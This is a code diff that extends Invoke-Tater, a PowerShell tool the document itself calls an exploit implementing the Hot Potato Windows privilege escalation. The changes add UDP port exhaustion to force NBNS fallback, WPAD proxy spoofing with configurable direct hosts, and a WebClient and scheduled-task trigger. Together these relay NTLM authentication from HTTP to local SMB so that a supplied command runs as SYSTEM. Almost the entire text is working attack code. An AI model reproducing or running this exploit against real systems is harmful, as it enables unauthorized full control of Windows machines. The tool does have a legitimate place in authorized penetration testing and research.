@@ -2,10 +2,10 @@ Function Invoke-Tater
 {
 <#
 .SYNOPSIS
-Invoke-Tater is a PowerShell implementation of the Hot Potato Windows Privilege Escalation.
+Invoke-Tater is a PowerShell implementation of the Hot Potato Windows Privilege Escalation exploit from @breenmachine and @foxglovesec.
 
 .DESCRIPTION
-Invoke-Tater is a PowerShell implementation of the Hot Potato Windows Privilege Escalation with functionality similiar to Potato.exe.
+Invoke-Tater is a PowerShell implementation of the Hot Potato Windows Privilege Escalation exploit from @breenmachine and @foxglovesec. It has functionality similiar to Potato.exe available at https://github.com/foxglovesec/Potato.
 
 .PARAMETER IP
 Specify a specific local IP address.
@@ -16,8 +16,23 @@ Command to execute as SYSTEM on the localhost.
 .PARAMETER NBNS
 Default = Enabled: (Y/N) Enable/Disable NBNS bruteforce spoofing. If disabled, another method of spoofing will need to be employed such as an LLMNR/NBNS spoofer running on another system and pointing to 127.0.0.1. 
 
+.PARAMETER ExhaustUDP
+Default = Disabled: Enable/Disable UDP port exhaustion to force all DNS lookups to fail in order to fallback to NBNS resolution.
+
+.PARAMETER HTTPPort
+Default = 80: Specify a TCP port for HTTP listener. 
+
+.PARAMETER Hostname
+Default = WPAD: Hostname to spoof. "WPAD.DOMAIN.TLD" is required by Windows Server 2008.
+
+.PARAMETER WPADDirectHosts
+Comma separated list of hosts to list as direct in the wpad.dat file. Note that 'localhost' is always listed as direct.
+
 .PARAMETER Trigger
-Default = Enabled: (Y/N) Enable/Disable the Windows Defender signature updates. If disabled, another method will need to be employed to trigger a relay.
+Default = 1: Trigger type to use in order to trigger HTTP to SMB relay. 0 = None, 1 = Windows Defender Signature Update, 2 = Windows 10 Webclient/Scheduled Task
+
+.PARAMETER Taskname
+Default = omg: Scheduled task name to use with trigger 2.
 
 .PARAMETER RunTime
 (Integer) Set the run time duration in minutes.
@@ -49,15 +64,19 @@ https://github.com/Kevin-Robertson/Tater
 param
 ( 
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$NBNS="Y",
-    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$Trigger="Y",
+    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$ExhaustUDP="N",
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$ConsoleOutput="Y",
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$StatusOutput="Y",
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$ShowHelp="Y",
     [parameter(Mandatory=$false)][ValidateSet("0","1","2")][string]$Tool="0",
     [parameter(Mandatory=$false)][ValidateScript({$_ -match [IPAddress]$_ })][string]$IP="",
-    [parameter(Mandatory=$false)][int]$RunTime = "",
+    [parameter(Mandatory=$false)][int]$HTTPPort="80",
+    [parameter(Mandatory=$false)][int]$RunTime="",
+    [parameter(Mandatory=$false)][ValidateSet(0,1,2)][int]$Trigger="1",
     [parameter(Mandatory=$true)][string]$Command = "",
     [parameter(Mandatory=$false)][string]$Hostname = "WPAD",  
+    [parameter(Mandatory=$false)][string]$Taskname = "omg",
+    [parameter(Mandatory=$false)][array]$WPADDirectHosts,
     [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
 )
 
@@ -86,17 +105,15 @@ if($tater.running)
     Throw "Invoke-Tater is already running, use Stop-Tater"
 }
 
-if(!$tater.running)
-{
-    $tater.console_queue = New-Object System.Collections.ArrayList
-    $tater.status_queue = New-Object System.Collections.ArrayList
-    $tater.console_output = $true
-    $tater.console_input = $true
-}
-
+$tater.console_queue = New-Object System.Collections.ArrayList
+$tater.status_queue = New-Object System.Collections.ArrayList
+$tater.console_output = $true
+$tater.console_input = $true
 $tater.running = $true
+$tater.exhaust_UDP_running = $false
 $tater.SMB_relay_active_step = 0
 $tater.SMB_relay = $true
+$tater.trigger = $Trigger
 
 if($StatusOutput -eq 'y')
 {
@@ -127,22 +144,52 @@ else
     $tater.newline = ""
 }
 
+if($Trigger -eq 2)
+{
+    $NBNS = 'N'
+}
+
 # Write startup messages
 $tater.status_queue.add("$(Get-Date -format 's') - Tater (Hot Potato Privilege Escalation) started")|Out-Null
 $tater.status_queue.add("Local IP Address = $IP") |Out-Null
 
+if($HTTPPort -ne 80)
+{
+    $tater.status_queue.add("HTTP Port = $HTTPPort")|Out-Null
+}
+
 if($NBNS -eq 'y')
 {
-    $tater.status_queue.add("Spoofing Hostname $Hostname")|Out-Null
+    $tater.status_queue.add("Spoofing Hostname = $Hostname")|Out-Null
 }
 else
 {
     $tater.status_queue.add("NBNS Bruteforce Spoofing Disabled")|Out-Null
 }
 
-if($Trigger -eq 'n')
+if($WPADDirectHosts.Count -gt 0)
+{
+    $tater.status_queue.add("WPAD Direct Hosts = " + $WPADDirectHosts -join ",")|Out-Null
+}
+
+if($ExhaustUDP -eq 'y')
+{
+    $tater.status_queue.add("UDP Port Exhaustion Enabled")|Out-Null
+}
+
+if($Trigger -eq 0)
 {
     $tater.status_queue.add("Relay Trigger Disabled")|Out-Null
+}
+elseif($Trigger -eq 1)
+{
+    $tater.status_queue.add("Windows Defender Trigger Enabled")|Out-Null
+}
+elseif($Trigger -eq 2)
+{
+    $tater.status_queue.add("Scheduled Task Trigger Enabled")|Out-Null
+    $tater.status_queue.add("Scheduled Task = $Taskname")|Out-Null
+    $tater.taskname = $Taskname
 }
 
 if($ConsoleOutput -eq 'y')
@@ -231,6 +278,22 @@ $shared_basic_functions_scriptblock =
         $string_data = $string_data.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
         $string_extract = New-Object System.String ($string_data,0,$string_data.Length)
         return $string_extract
+    }
+
+    Function DnsFlushResolverCache
+    {
+        $DNS_member_definition = @'
+            [DllImport("dnsapi.dll", EntryPoint="DnsFlushResolverCache")]
+            private static extern UInt32 DnsFlushResolverCache();
+
+            public static void FlushResolverCache()
+            {
+                UInt32 result = DnsFlushResolverCache();
+            }
+'@
+
+        Add-Type -MemberDefinition $DNS_member_definition -Namespace DNSAPI -Name Flush -UsingNamespace System.Collections,System.ComponentModel
+        [DNSAPI.Flush]::FlushResolverCache()
     }
 
     Function HTTPListenerStop
@@ -666,7 +729,7 @@ $SMB_relay_execute_scriptblock =
 # HTTP/HTTPS Server ScriptBlock - HTTP/HTTPS listener
 $HTTP_scriptblock = 
 { 
-    param ($Command)
+    param ($Command,$WPADDirectHosts)
 
     Function NTLMChallengeBase64
     {
@@ -695,6 +758,21 @@ $HTTP_scriptblock =
     }
 
     $SMBRelayTarget = "127.0.0.1"
+
+    $WPADDirectHosts += "localhost"
+
+    $HTTP_content_length = 64
+
+    foreach($WPAD_direct_host in $WPADDirectHosts)
+    {
+        $HTTP_content_length += $WPAD_direct_host.length + 43
+        $HTTP_content_length_bytes = [System.Text.Encoding]::ASCII.GetBytes($HTTP_content_length)
+        $WPAD_direct_host_bytes = [System.Text.Encoding]::ASCII.GetBytes($WPAD_direct_host)
+        $WPAD_direct_host_function_bytes = (0x69,0x66,0x20,0x28,0x64,0x6e,0x73,0x44,0x6f,0x6d,0x61,0x69,0x6e,0x49,0x73,0x28,0x68,0x6f,0x73,0x74,0x2c,0x20,0x22)`
+            + $WPAD_direct_host_bytes`
+            +(0x22,0x29,0x29,0x20,0x72,0x65,0x74,0x75,0x72,0x6e,0x20,0x22,0x44,0x49,0x52,0x45,0x43,0x54,0x22,0x3b)
+        $WPAD_direct_hosts_bytes += $WPAD_direct_host_function_bytes
+    }
     
     :HTTP_listener_loop while ($tater.running)
     {
@@ -736,7 +814,7 @@ $HTTP_scriptblock =
 
         $TCP_request = [System.BitConverter]::ToString($TCP_request_bytes)
 
-        if($TCP_request -like "47-45-54-20*" -or $TCP_request -like "48-45-41-44-20*")
+        if($TCP_request -like "47-45-54-20*" -or $TCP_request -like "48-45-41-44-20*" -or $TCP_request -like "4f-50-54-49-4f-4e-53-20*")
         {
             $HTTP_raw_URL = $TCP_request.Substring($TCP_request.IndexOf("-20-") + 4,$TCP_request.Substring($TCP_request.IndexOf("-20-") + 1).IndexOf("-20-") - 3)
             $HTTP_raw_URL = $HTTP_raw_URL.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
@@ -769,9 +847,9 @@ $HTTP_scriptblock =
             $tater.response_StatusCode = (0x32,0x30,0x30)
             $HTTP_response_phrase = (0x4f,0x4b)
             $HTTP_WPAD_response = (0x66,0x75,0x6e,0x63,0x74,0x69,0x6f,0x6e,0x20,0x46,0x69,0x6e,0x64,0x50,0x72,0x6f,0x78,0x79,0x46,0x6f,0x72,0x55,0x52,0x4c,0x28)`
-                + (0x75,0x72,0x6c,0x2c,0x68,0x6f,0x73,0x74,0x29,0x7b,0x69,0x66,0x20,0x28,0x64,0x6e,0x73,0x44,0x6f,0x6d,0x61,0x69,0x6e,0x49,0x73,0x28,0x68,0x6f)`
-                + (0x73,0x74,0x2c,0x20,0x22,0x6c,0x6f,0x63,0x61,0x6c,0x68,0x6f,0x73,0x74,0x22,0x29,0x29,0x20,0x72,0x65,0x74,0x75,0x72,0x6e,0x20,0x22,0x44,0x49)`
-                + (0x52,0x45,0x43,0x54,0x22,0x3b,0x72,0x65,0x74,0x75,0x72,0x6e,0x20,0x22,0x50,0x52,0x4f,0x58,0x59,0x20,0x31,0x32,0x37,0x2e,0x30,0x2e,0x30,0x2e,0x31)`
+                + (0x75,0x72,0x6c,0x2c,0x68,0x6f,0x73,0x74,0x29,0x7b)`
+                + $WPAD_direct_hosts_bytes`
+                + (0x72,0x65,0x74,0x75,0x72,0x6e,0x20,0x22,0x50,0x52,0x4f,0x58,0x59,0x20,0x31,0x32,0x37,0x2e,0x30,0x2e,0x30,0x2e,0x31)`
                 + (0x3a,0x38,0x30,0x22,0x3b,0x7d)
 
             $NTLM = ''
@@ -798,10 +876,17 @@ $HTTP_scriptblock =
             $HTTP_response_phrase = (0x4f,0x4b)
             $NTLM = ''
             $HTTP_request_type = "Redirect"
-            $tater.console_queue.add("$(Get-Date -format 's') - Attempting to redirect http://localhost/gethashes and trigger relay")
+
+            if($tater.HTTP_client_handle_old -ne $tater.HTTP_client.Client.Handle)
+            {
+                $tater.console_queue.add("$(Get-Date -format 's') - Attempting to redirect to http://localhost/gethashes and trigger relay")
+            }
         }
 
-        $tater.console_queue.add("$(Get-Date -format 's') - $HTTP_type request for " + $tater.request_RawUrl + " received from " + $tater.HTTP_client.Client.RemoteEndpoint.Address)
+        if(($tater.request_RawUrl_old -ne $tater.request_RawUrl -and $tater.HTTP_client_handle_old -ne $tater.HTTP_client.Client.Handle) -or $tater.HTTP_client_handle_old -ne $tater.HTTP_client.Client.Handle)
+        {
+            $tater.console_queue.add("$(Get-Date -format 's') - $HTTP_type request for " + $tater.request_RawUrl + " received from " + $tater.HTTP_client.Client.RemoteEndpoint.Address)
+        }
 
         if($authentication_header.startswith('NTLM '))
         {
@@ -890,18 +975,25 @@ $HTTP_scriptblock =
                 else
                 {  
                     $HTTP_NTLM_domain_string = DataToString $HTTP_NTLM_domain_length 0 0 $HTTP_NTLM_domain_offset $HTTP_request_bytes
-                } 
-                    
+                }
+
                 $HTTP_NTLM_user_length = DataLength 36 $HTTP_request_bytes
-                $HTTP_NTLM_user_string = DataToString $HTTP_NTLM_user_length $HTTP_NTLM_domain_length 0 $HTTP_NTLM_domain_offset $HTTP_request_bytes
-                        
                 $HTTP_NTLM_host_length = DataLength 44 $HTTP_request_bytes
-                $HTTP_NTLM_host_string = DataToString $HTTP_NTLM_host_length $HTTP_NTLM_domain_length $HTTP_NTLM_user_length $HTTP_NTLM_domain_offset $HTTP_request_bytes
-                
+
+                if ([System.BitConverter]::ToString($HTTP_request_bytes[16]) -eq '58' -and [System.BitConverter]::ToString($HTTP_request_bytes[24]) -eq '58' -and [System.BitConverter]::ToString($HTTP_request_bytes[32]) -eq '58')
+                {
+                    $HTTP_NTLM_user_string = ''
+                    $HTTP_NTLM_host_string = ''
+                }
+                else
+                {
+                    $HTTP_NTLM_user_string = DataToString $HTTP_NTLM_user_length $HTTP_NTLM_domain_length 0 $HTTP_NTLM_domain_offset $HTTP_request_bytes
+                    $HTTP_NTLM_host_string = DataToString $HTTP_NTLM_host_length $HTTP_NTLM_domain_length $HTTP_NTLM_user_length $HTTP_NTLM_domain_offset $HTTP_request_bytes
+                }
+
                 $NTLM_type = "NTLMv2"           
                 $NTLM_response = [System.BitConverter]::ToString($HTTP_request_bytes[$HTTP_NTLM_offset..($HTTP_NTLM_offset + $HTTP_NTLM_length)]) -replace "-",""
                 $NTLM_response = $NTLM_response.Insert(32,':')
-                $tater.HTTP_NTLM_hash = $HTTP_NTLM_user_string + "::" + $HTTP_NTLM_domain_string + ":" + $NTLM_challenge + ":" + $NTLM_response
                 
                 $tater.response_StatusCode = (0x32,0x30,0x30)
                 $HTTP_response_phrase = (0x4f,0x4b)
@@ -909,7 +1001,7 @@ $HTTP_scriptblock =
                 
                 if (($tater.SMB_relay) -and ($tater.SMB_relay_active_step -eq 3))
                 {
-                    $tater.console_queue.add("$(Get-Date -format 's') - Sending $NTLM_type response for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string for relay to $SMBRelaytarget")
+                    $tater.console_queue.add("$(Get-Date -format 's') - Sending response for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string for relay to $SMBRelaytarget")
                     $SMB_relay_response_return_bytes = SMBRelayResponse $SMB_relay_socket $HTTP_request_bytes $SMB_user_ID
                     $SMB_relay_response_return_bytes = $SMB_relay_response_return_bytes[1..$SMB_relay_response_return_bytes.length]
                     
@@ -963,7 +1055,9 @@ $HTTP_scriptblock =
                 + $HTTP_response_phrase`
                 + (0x0d,0x0a)`
                 + (0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x54,0x79,0x70,0x65,0x3a,0x20,0x74,0x65,0x78,0x74,0x2f,0x68,0x74,0x6d,0x6c,0x3b,0x20,0x63,0x68,0x61,0x72,0x73,0x65,0x74,0x3d,0x75,0x74,0x66,0x2d,0x38,0x0d,0x0a)`
-                + (0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x4c,0x65,0x6e,0x67,0x74,0x68,0x3a,0x20,0x31,0x31,0x36,0x0d,0x0a)`
+                + (0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x4c,0x65,0x6e,0x67,0x74,0x68,0x3a,0x20)`
+                + $HTTP_content_length_bytes`
+                + (0x0d,0x0a)`
                 + (0x53,0x65,0x72,0x76,0x65,0x72,0x3a,0x20,0x4d,0x69,0x63,0x72,0x6f,0x73,0x6f,0x66,0x74,0x2d,0x48,0x54,0x54,0x50,0x41,0x50,0x49,0x2f,0x32,0x2e,0x30,0x0d,0x0a)`
                 + (0x44,0x61,0x74,0x65,0x3a)`
                 + $HTTP_timestamp`
@@ -1001,9 +1095,83 @@ $HTTP_scriptblock =
         $HTTP_stream.write($HTTP_response, 0, $HTTP_response.length)
         $HTTP_stream.Flush()
         start-sleep -s 1
+        $tater.request_RawUrl_old = $tater.request_RawUrl
+        $tater.HTTP_client_handle_old= $tater.HTTP_client.Client.Handle
 
     }
 
+}
+
+$exhaust_UDP_scriptblock = 
+{
+    $tater.exhaust_UDP_running = $true
+    $tater.console_queue.add("$(Get-Date -format 's') - Trying to exhaust UDP source ports so DNS lookups will fail")
+    $UDP_socket_list = New-Object "System.Collections.Generic.List[Net.Sockets.Socket]"
+    $UDP_failed_ports_list = New-Object "System.Collections.Generic.List[Int]"
+
+    $i=0
+    for ($i = 0; $i -le 65535; $i++)
+    {
+        try
+        {
+            if ($i -ne 137 -and $i -ne 53)
+            {
+                $IP_end_point = New-Object System.Net.IPEndpoint([Net.IPAddress]::Any, $i)
+                $UDP_socket = New-Object Net.Sockets.Socket( [Net.Sockets.AddressFamily]::InterNetwork,[Net.Sockets.SocketType]::Dgram,[Net.Sockets.ProtocolType]::Udp )
+                $UDP_socket.Bind($IP_end_point)
+                $UDP_socket_list.Add($UDP_socket)
+            }
+        }
+        catch
+        {
+            $UDP_failed_ports_list.Add($i);
+            $tater.console_queue.add("$(Get-Date -format 's') - Couldn't bind to UDP port $i")
+        }
+    }
+
+    $tater.UDP_exhaust_success = $false
+
+    while (!$tater.UDP_exhaust_success)
+    {
+        if(!$suppress_flush_message)
+        {
+            $tater.console_queue.add("$(Get-Date -format 's') - Flushing DNS resolver cache")
+            $suppress_flush_message = $true
+        }
+
+        DnsFlushResolverCache
+
+        try
+        {
+            $host_lookup = [System.Net.Dns]::GetHostEntry("microsoft.com")
+        }
+        catch
+        {
+            $tater.console_queue.add("$(Get-Date -format 's') - DNS lookup failed so UDP exhaustion worked")
+            $tater.UDP_exhaust_success = $true
+            break
+        }
+
+        $tater.console_queue.add("$(Get-Date -format 's') - DNS lookup succeeded so UDP exhaustion failed")
+
+        foreach ($UDP_port in $UDP_failed_ports_list)
+        {
+            try
+            {
+                $IP_end_point = New-Object System.Net.IPEndpoint([Net.IPAddress]::Any, $i)
+                $UDP_socket = New-Object Net.Sockets.Socket( [Net.Sockets.AddressFamily]::InterNetwork,[Net.Sockets.SocketType]::Dgram,[Net.Sockets.ProtocolType]::Udp )
+                $UDP_socket.Bind($IP_end_point)
+                $UDP_socket_list.Add($UDP_socket)
+                $UDP_failed_ports.Remove($UDP_port)
+            }
+            catch
+            {
+                $tater.console_queue.add("$(Get-Date -format 's') - Failed to bind to $UDP_port during cleanup")
+            }
+        } 
+    }
+
+    $tater.exhaust_UDP_running = $false
 }
 
 $spoofer_scriptblock = 
@@ -1036,7 +1204,17 @@ $spoofer_scriptblock =
         + $hostname_bytes`
         + (0x00,0x20,0x00,0x01,0x00,0x00,0x00,0xa5,0x00,0x06,0x00,0x00,0x7f,0x00,0x00,0x01)`
         + (0x00,0x00,0x00,0x00)
-                
+      
+    while($tater.exhaust_UDP_running)
+    {
+        Start-Sleep -s 2
+    }
+
+    $tater.console_queue.add("$(Get-Date -format 's') - Flushing DNS resolver cache")
+    DnsFlushResolverCache
+
+    $tater.console_queue.add("$(Get-Date -format 's') - Starting NBNS spoofer to resolve $Hostname to 127.0.0.1")
+              
     $send_socket = New-Object System.Net.Sockets.UdpClient(137)
     $destination_IP = [system.net.IPAddress]::Parse($IP)
     $destination_point = New-Object Net.IPEndpoint($destination_IP,137)
@@ -1058,9 +1236,9 @@ $spoofer_scriptblock =
     $send_socket.Close()
  }
 
- $tater_scriptblock = 
+$tater_scriptblock = 
 {
-    param ($NBNS,$RunTime,$Hostname,$Trigger)
+    param ($NBNS,$RunTime,$Hostname)
     
     Function HTTPListenerStop
     {
@@ -1084,39 +1262,87 @@ $spoofer_scriptblock =
 
     while ($tater.running)
     {
-        try
+        if($tater.trigger -ne 2)
         {
-            $Hostname_IP = [System.Net.Dns]::GetHostEntry($Hostname).AddressList[0].IPAddressToString
-        }
-        catch{}
+            try
+            {
+                $Hostname_IP = [System.Net.Dns]::GetHostEntry($Hostname).AddressList[0].IPAddressToString
+            }
+            catch{}
             
-        if($Hostname_IP -eq "127.0.0.1" -and !$suppress_spoofed_message)
-        {
-            $tater.console_queue.add("$(Get-Date -format 's') - $Hostname has been spoofed to 127.0.0.1")
-            $suppress_spoofed_message = $true
-            $hostname_spoof = $true
-            $Hostname_IP = ""
-        }
-        elseif((!$Hostname_IP -or $Hostname_IP -ne "127.0.0.1") -and $NBNS -eq 'y')
-        {
-            $tater.console_queue.add("$(Get-Date -format 's') - Attempting to spoof $Hostname to 127.0.0.1")
-            $suppress_spoofed_message = $false
-            $hostname_spoof = $false
+            if($Hostname_IP -eq "127.0.0.1" -and !$suppress_spoofed_message)
+            {
+                $tater.console_queue.add("$(Get-Date -format 's') - $Hostname has been spoofed to 127.0.0.1")
+                $suppress_spoofed_message = $true
+                $hostname_spoof = $true
+                $Hostname_IP = ""
+            }
+            elseif((!$Hostname_IP -or $Hostname_IP -ne "127.0.0.1") -and $NBNS -eq 'y')
+            {
+                $suppress_spoofed_message = $false
+                $hostname_spoof = $false
+            }
         }
 
-        if(!$tater.SMBRelay_success -and $Trigger -eq 'y')
+        if(!$tater.SMBRelay_success -and $tater.trigger -eq 1)
         {
             if(Test-Path "C:\Program Files\Windows Defender\MpCmdRun.exe")
             {
                 if(($process_defender.HasExited -or !$process_defender) -and !$tater.SMB_relay_success -and $hostname_spoof)
                 {
-                    $process_defender = Start-Process -FilePath "C:\Program Files\Windows Defender\MpCmdRun.exe" -Argument SignatureUpdate -WindowStyle Hidden -passthru
                     $tater.console_queue.add("$(Get-Date -format 's') - Starting Windows Defender signature update")
+                    $process_defender = Start-Process -FilePath "C:\Program Files\Windows Defender\MpCmdRun.exe" -Argument SignatureUpdate -WindowStyle Hidden -passthru
                 }
             }
             else
             {
                 $tater.console_queue.add("Windows Defender not found")
+            }
+        }
+        elseif(!$tater.SMBRelay_success -and $tater.trigger -eq 2)
+        {
+            $service_webclient = Get-Service WebClient
+
+            if($service_webclient.Status -eq 'Stopped')
+            {
+                $tater.console_queue.add("$(Get-Date -format 's') - Starting WebClient service")
+                $process_webclient = Start-Process -FilePath "cmd.exe" -Argument "/C pushd \\live.sysinternals.com\tools" -WindowStyle Hidden -passthru -Wait
+            }
+
+            if($service_webclient.Status -eq 'Running' -and !$scheduled_task_added -and !$tater.SMBRelay_success)
+            {
+                $timestamp_add = (Get-Date).AddMinutes(1)
+                $timestamp_add_string = $timestamp_add.ToString("HH:mm")
+                $tater.console_queue.add("$(Get-Date -format 's') - Adding scheduled task " + $tater.taskname)
+                $process_scheduled_task = "/C schtasks.exe /Create /TN " + $tater.taskname + " /TR  \\127.0.0.1\test /SC ONCE /ST $timestamp_add_string /F"
+                Start-Process -FilePath "cmd.exe" -Argument $process_scheduled_task -WindowStyle Hidden -passthru -Wait
+                
+                $schedule_service = new-object -com("Schedule.Service")
+                $schedule_service.connect() 
+                $scheduled_task_list = $schedule_service.getfolder("\").gettasks(1)
+
+                $scheduled_task_added = $false
+
+                foreach($scheduled_task in $scheduled_task_list)
+                {
+                    if($scheduled_task.name -eq $tater.taskname)
+                    {
+                        $scheduled_task_added = $true
+                    }
+                }
+
+                $schedule_service.Quit()
+
+                if(!$scheduled_task_added -and !$tater.SMBRelay_success)
+                {
+                    $tater.console_queue.add("$(Get-Date -format 's') - Adding scheduled task " + $tater.taskname + " failed")
+                    HTTPListenerStop
+                }
+            }
+            elseif($scheduled_task_added -and (Get-Date) -ge $timestamp_add.AddMinutes(2))
+            {
+                $tater.console_queue.add("$(Get-Date -format 's') - Something went wrong with the service")
+                HTTPListenerStop
             }
         }
 
@@ -1140,7 +1366,7 @@ $spoofer_scriptblock =
 # HTTP/HTTPS Listener Startup Function 
 Function HTTPListener()
 {
-    $tater.HTTP_endpoint = New-Object System.Net.IPEndPoint([ipaddress]::loopback,80)
+    $tater.HTTP_endpoint = New-Object System.Net.IPEndPoint([ipaddress]::loopback,$HTTPPort)
     $tater.HTTP_listener = New-Object System.Net.Sockets.TcpListener $tater.HTTP_endpoint
     $tater.HTTP_listener.Start()
     $HTTP_runspace = [runspacefactory]::CreateRunspace()
@@ -1153,8 +1379,21 @@ Function HTTPListener()
     $HTTP_powershell.AddScript($SMB_relay_response_scriptblock) > $null
     $HTTP_powershell.AddScript($SMB_relay_execute_scriptblock) > $null
     $HTTP_powershell.AddScript($SMB_NTLM_functions_scriptblock) > $null
-    $HTTP_powershell.AddScript($HTTP_scriptblock).AddArgument($Command) > $null
+    $HTTP_powershell.AddScript($HTTP_scriptblock).AddArgument($Command).AddArgument($WPADDirectHosts) > $null
     $HTTP_handle = $HTTP_powershell.BeginInvoke()
+}
+
+# Exhaust UDP Startup Function
+Function ExhaustUDP()
+{
+    $exhaust_UDP_runspace = [runspacefactory]::CreateRunspace()
+    $exhaust_UDP_runspace.Open()
+    $exhaust_UDP_runspace.SessionStateProxy.SetVariable('tater',$tater)
+    $exhaust_UDP_powershell = [powershell]::Create()
+    $exhaust_UDP_powershell.Runspace = $exhaust_UDP_runspace
+    $exhaust_UDP_powershell.AddScript($shared_basic_functions_scriptblock) > $null
+    $exhaust_UDP_powershell.AddScript($exhaust_UDP_scriptblock) > $null
+    $exhaust_UDP_handle = $exhaust_UDP_powershell.BeginInvoke()
 }
 
 # Spoofer Startup Function
@@ -1179,12 +1418,18 @@ Function TaterLoop()
     $tater_runspace.SessionStateProxy.SetVariable('tater',$tater)
     $tater_powershell = [powershell]::Create()
     $tater_powershell.Runspace = $tater_runspace
-    $tater_powershell.AddScript($tater_scriptblock).AddArgument($NBNS).AddArgument($RunTime).AddArgument($Hostname).AddArgument($Trigger) > $null
+    $tater_powershell.AddScript($tater_scriptblock).AddArgument($NBNS).AddArgument($RunTime).AddArgument($Hostname) > $null
     $tater_handle = $tater_powershell.BeginInvoke()
 }
 
 # HTTP Server Start
 HTTPListener
+
+# Exhaust UDP Start
+if($ExhaustUDP -eq 'y')
+{
+    ExhaustUDP
+}
 
 # Spoofer Start
 if($NBNS -eq 'y')
@@ -1223,13 +1468,19 @@ if(!$tater.running)
 {
     if($tater.SMBRelay_success)
     {  
-        $tater.SMBRelay_success = $false
+        if($trigger -eq 2)
+        {
+            Write-Output "$(Get-Date -format 's') - Remove scheduled task $Taskname manually when finished"
+        }
+
         Write-Output "$(Get-Date -format 's') - Tater was successful and has exited"
     }
     else
     {
         Write-Output "$(Get-Date -format 's') - Tater was not successful and has exited"
     }
+
+    Remove-Variable tater -scope global
 }
 
 }
@@ -1251,7 +1502,6 @@ Function Stop-Tater
             $tater.HTTP_listener.server.Close()
             Start-Sleep -s 1
             $tater.HTTP_listener.Stop()
-            $tater.SMBRelay_success = $false
             $tater.running = $false
             $tater.status_queue.add("$(Get-Date -format 's') - Tater has been stopped")|Out-Null
         }
